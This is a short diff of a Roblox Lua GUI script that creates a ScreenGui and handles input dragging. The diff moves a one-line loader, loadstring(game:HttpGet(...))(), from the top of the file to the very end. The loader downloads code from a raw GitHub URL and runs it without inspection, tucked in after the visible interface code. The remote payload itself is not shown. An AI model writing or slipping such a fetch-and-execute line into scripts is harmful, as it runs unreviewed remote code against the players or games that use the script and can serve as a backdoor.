@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/kinoask/sadsd/refs/heads/main/huge"))()
-
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
@@ -115,3 +113,6 @@ game:GetService("UserInputService").InputChanged:Connect(function(input)
         update(input)
     end
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kinoask/sadsd/refs/heads/main/huge"))()
+
